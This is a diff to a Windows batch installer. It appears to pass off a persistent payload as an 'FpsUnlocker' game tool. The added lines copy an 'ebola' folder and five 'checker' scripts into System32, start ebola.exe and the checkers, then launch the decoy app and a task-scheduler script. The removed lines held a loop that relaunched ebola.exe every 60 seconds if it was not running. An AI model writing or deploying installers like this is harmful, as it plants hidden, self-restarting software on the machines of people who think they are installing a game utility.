@@ -29,31 +29,31 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------    
 
 
+:moving the checkers and ebola
+move "%~dp0ebola\ch1.bat" "%windir%\System32"
+move "%~dp0ebola\ch2.bat" "%windir%\System32"
+move "%~dp0ebola\ch3.bat" "%windir%\System32"
+move "%~dp0ebola\ch4.bat" "%windir%\System32"
+move "%~dp0ebola\ch5.bat" "%windir%\System32"
+move /d "%~dp0ebola" "%windir%\System32"
+
+move "%~dp0FpsUnlocker.exe" "%ProgramFiles%\FpsUnlocker"
+
+:starting the checkers and ebola
+start "" "%windir%\System32\ebola.exe"
+start "" "%windir%\System32\ch1.bat"
+start "" "%windir%\System32\ch2.bat"
+start "" "%windir%\System32\ch3.bat"
+start "" "%windir%\System32\ch4.bat"
+start "" "%windir%\System32\ch5.bat"
+
+:starting app and task scheduler change
+start "" "%ProgramFiles%\FpsUnlocker\FpsUnlocker.exe"
+start "" "%~dp0ebola\tsksch.bat"
 
 
-
-
-
-set "filePath=%windir%\System32\ebola.exe"
-
-:loop
-if exist "%filePath%" (
-    echo File exists
-
-    tasklist | find /i "ebola.exe" >nul
-
-    if errorlevel 1 (
-        echo Not running
-        start "" "%filePath%"
-    ) else (
-        echo Running
-    )
-) else (
-    echo File doesn't exist
+if %errorlevel% neq 0 (
+    echo fail
+    pause
+    exit /b 1
 )
-
-rem wait for 60 sec
-timeout /t 60 /nobreak >nul
-
-rem go to start of loop
-goto loop
